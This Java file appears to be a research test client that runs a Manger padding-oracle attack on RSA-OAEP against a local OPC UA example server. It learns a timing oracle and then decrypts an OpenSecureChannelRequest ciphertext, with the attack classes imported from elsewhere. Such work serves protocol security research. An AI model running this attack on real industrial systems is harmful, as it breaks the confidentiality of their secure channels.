import attacks.CipherTextHelper;
import attacks.manger.MangerAttack;
import attacks.manger.oracle.DistinguishableErrorOracle;
import attacks.manger.oracle.MangerTestOracle;
import attacks.manger.oracle.Oracle;
import attacks.manger.oracle.OracleException;
import attacks.manger.oracle.learner.ErrorCodeOracleLearner;
import attacks.manger.oracle.learner.OracleLearner;
import attacks.manger.oracle.learner.TimingOracleLearner;
import opcua.context.Context;
import opcua.message.HelloMessage;
import opcua.message.Message;
import opcua.message.OpenSecureChannelRequest;
import opcua.message.parts.MessageType;
import opcua.message.parts.RequestHeader;
import opcua.message.parts.SecurityTokenRequestType;
import opcua.model.type.NodeId;
import opcua.model.type.ObjectIds;
import opcua.security.*;
import opcua.util.MessageReceiver;
import opcua.util.MessageSender;
import opcua.util.MessageUtility;
import org.apache.log4j.Logger;
import org.bouncycastle.jce.provider.BouncyCastleProvider;
import org.bouncycastle.operator.OperatorCreationException;
import org.bouncycastle.util.test.Test;
import transport.tcp.ClientTcpConnection;

import javax.crypto.Cipher;
import java.io.FileInputStream;
import java.io.IOException;
import java.math.BigInteger;
import java.security.*;
import java.security.cert.CertificateException;
import java.security.cert.CertificateFactory;
import java.security.cert.X509Certificate;
import java.security.interfaces.RSAPrivateKey;
import java.security.interfaces.RSAPublicKey;
import java.time.Instant;

public class TestClient {
    private static final Logger LOG = Logger.getRootLogger();

    public static void main(String[] args) throws CertificateException, NoSuchAlgorithmException, OperatorCreationException, IOException, OracleException {

        Security.addProvider(new BouncyCastleProvider());


        //Load server cert
        CertificateFactory certificateFactory = CertificateFactory.getInstance("X.509");
        X509Certificate remoteCertificate = (X509Certificate) certificateFactory.generateCertificate(TestClient.class.getClassLoader().getResourceAsStream("ua-java-ServerExample1.der"));

        //Create client keypair and generate self signed certificate
        KeyPairGenerator keyPairGenerator = KeyPairGenerator.getInstance("RSA");
        keyPairGenerator.initialize(2048);
        KeyPair keyPair = keyPairGenerator.generateKeyPair();
        X509Certificate localCertificate = CertificateUtil.generateSelfSignedCertificate(keyPair, "CN=OpcUaAttacker", "SHA256withRSA");

        //Generate the client nonce
        byte[] clientNonce = new byte[SecurityPolicy.BASIC256.getSymmetricEncryptionNonceLength()];
        SecureRandom random = new SecureRandom();
        random.nextBytes(clientNonce);

        //Opn Message
        RequestHeader requestHeader = new RequestHeader(ObjectIds.OPEN_SECURE_CHANNEL_REQUEST, null, 0, 0, "", 5000);
        OpenSecureChannelRequest openSecureChannelRequest = new OpenSecureChannelRequest(
                requestHeader, 0, SecurityTokenRequestType.ISSUE, MessageSecurityMode.SIGN_AND_ENCRYPT, clientNonce, 5000
        );

        Context context = new Context();
        context.setMessageSecurityMode(MessageSecurityMode.SIGN_AND_ENCRYPT);
        context.setSecurityPolicy(SecurityPolicy.BASIC256);
        context.setRemoteCertificate(remoteCertificate);
        context.setLocalPrivateKey((RSAPrivateKey) keyPair.getPrivate());
        context.setLocalCertificate(localCertificate);
        context.setEndpointUrl("opc.tcp://DESKTOP-N27PTVO:8666/UAExample");
        context.setRemoteHostname("127.0.0.1");
        context.setRemotePort(8666);

        byte[] cipherText = MessageUtility.getSignedEncrypted(openSecureChannelRequest, context);

        /*
        //Decrypt block 1
        DistinguishableErrorOracle oracle = new DistinguishableErrorOracle(context, message ->  message.getReason().contains("data wrong"), cipherText,0);
        MangerAttack attack = new MangerAttack(oracle.getCipherBlock(), oracle, (RSAPublicKey)context.getRemoteCertificate().getPublicKey());
        byte[] oaepEncodedPlaintext = attack.executeAttack();
        byte[] result = OAEPUtility.decode(oaepEncodedPlaintext);


        System.out.println(oracle.getQueryCount());
        //System.out.println(oracle2.getQueryCount());
        */


        OracleLearner learner = new TimingOracleLearner(context, cipherText);
        OracleLearner.LearningResult result = learner.learn(8*256);

        System.out.println(result.getConfidence());

        Oracle oracle = result.getOracle();
        MangerAttack attack = new MangerAttack(((DistinguishableErrorOracle)oracle).getCipherBlock(), oracle, (RSAPublicKey)context.getRemoteCertificate().getPublicKey());
        byte[] oaepEncodedPlaintext = attack.executeAttack();
        byte[] plain = OAEPUtility.decode(oaepEncodedPlaintext);

    }

}
